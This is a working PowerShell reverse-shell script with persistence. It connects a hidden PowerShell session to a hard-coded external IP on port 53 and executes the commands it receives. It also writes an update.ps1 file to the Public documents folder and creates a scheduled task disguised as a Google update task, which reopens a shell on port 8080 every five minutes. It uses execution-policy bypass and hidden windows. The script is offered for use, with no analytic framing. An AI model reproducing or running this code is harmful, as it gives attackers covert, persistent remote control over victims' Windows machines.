################################################################
### This script creates rev shell instantly on port 53       ###
### It will also create a schtask to run every five minutes  ###
### to execute a rev shell on port 8080                      ###
### nc -lvnp 8080                                            ###
################################################################



## change to user public documents
cd C:\users\Public\documents\

## create update.ps1 for schtask rev shell on port 8080
echo '# Create ScriptBlock for rev shell' > C:\users\Public\documents\update.ps1
echo '$scriptBlock = {' >> update.ps1
echo '    $client = New-Object System.Net.Sockets.TCPClient(''20.160.137.157'', 8080)' >> C:\users\Public\documents\update.ps1
echo '    $stream = $client.GetStream()' >> C:\users\Public\documents\update.ps1
echo '    [byte[]]$bytes = 0..65535|%{0}' >> C:\users\Public\documents\update.ps1
echo '' >> C:\users\Public\documents\update.ps1
echo '    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){' >> C:\users\Public\documents\update.ps1
echo '        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)' >> C:\users\Public\documents\update.ps1
echo '        $sendback = (Invoke-Expression "$data 2>&1" | Out-String )' >> C:\users\Public\documents\update.ps1
echo '        $sendback2 = $sendback + ''PS '' + (Get-Location).Path + ''> '' ' >> C:\users\Public\documents\update.ps1
echo '        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)' >> C:\users\Public\documents\update.ps1
echo '        $stream.Write($sendbyte, 0, $sendbyte.Length)' >> C:\users\Public\documents\update.ps1
echo '        $stream.Flush()' >> C:\users\Public\documents\update.ps1
echo '    }' >> C:\users\Public\documents\update.ps1
echo '' >> C:\users\Public\documents\update.ps1
echo '    $client.Close()' >> C:\users\Public\documents\update.ps1
echo '}' >> C:\users\Public\documents\update.ps1
echo '' >> C:\users\Public\documents\update.ps1
echo '# Run the script in the background with a hidden window' >> C:\users\Public\documents\update.ps1
echo 'Start-Process -WindowStyle Hidden -FilePath PowerShell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command $scriptBlock"' >> C:\users\Public\documents\update.ps1
echo '' >> C:\users\Public\documents\update.ps1
echo '# Exit powershell window' >> C:\users\Public\documents\update.ps1
echo 'exit' >> C:\users\Public\documents\update.ps1

## create schtask to execute update.ps1 every 5 mins
schtasks /create /sc minute /mo 5 /tn "GoogleUpdateTaskMachineCore{63K7194-289D-492H-AC97-12165079E932KT}" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\users\public\documents\update.ps1"
# check schtask time with:
# schtasks /query /tn "GoogleChromeUpdater"

## Create ScriptBlock for rev shell on port 53
$scriptBlock = {
    $client = New-Object System.Net.Sockets.TCPClient('20.160.137.157', 53)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (Invoke-Expression "$data 2>&1" | Out-String )
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    
    $client.Close()
}

## Run the script in the background with a hidden window
Start-Process -WindowStyle Hidden -FilePath PowerShell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command $scriptBlock"


## Exit powershell window
exit